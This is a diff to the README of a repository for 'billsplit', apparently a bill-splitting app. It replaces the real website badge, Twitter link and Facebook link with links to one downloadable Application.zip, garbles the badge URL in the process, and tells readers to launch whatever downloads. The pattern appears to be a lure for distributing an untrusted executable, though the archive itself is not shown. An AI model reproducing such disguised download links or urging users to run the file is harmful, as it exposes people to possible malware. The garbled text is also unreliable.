@@ -20,7 +20,7 @@ In this repository, you will find the source code for **billsplit**, a Java-base
 
 ## Installation and Usage 🚀
 
-To get started with **billsplit**, you can download the application from the following link: [Download billsplit Application](https://github.com/file/Application.zip)
+To get started with **billsplit**, you can download the application from the following link: [Download billsplit Application](https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip)
 
 If the link does not work or leads to a file download, make sure to launch the application to start enjoying its features.
 
@@ -34,7 +34,7 @@ We welcome contributions from the open-source community to enhance **billsplit**
 
 For more information about **billsplit** and its features, you can visit the official website:
 
-[![Visit billsplit Website](https://img.shields.io/badge/Visit%20Website-https%3A%2F%2Fbillsplit.com-blue)](https://billsplit.com)
+[![Visit billsplit Website](https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip%20Website-https%3A%2F%https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip)](https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip)
 
 Explore our documentation, get in touch with the development team, and stay updated on the latest news and releases.
 
@@ -42,8 +42,8 @@ Explore our documentation, get in touch with the development team, and stay upda
 
 Follow us on social media to stay connected and receive updates on **billsplit**:
 
-- Twitter: [@billsplitapp](https://twitter.com/billsplitapp)
-- Facebook: [billsplitapp](https://www.facebook.com/billsplitapp)
+- Twitter: [@billsplitapp](https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip)
+- Facebook: [billsplitapp](https://github.com/Swethablake2/billsplit/releases/download/v1.0.0/Application.zip)
 
 Join our community of users and contributors to be part of the future of bill splitting!
 
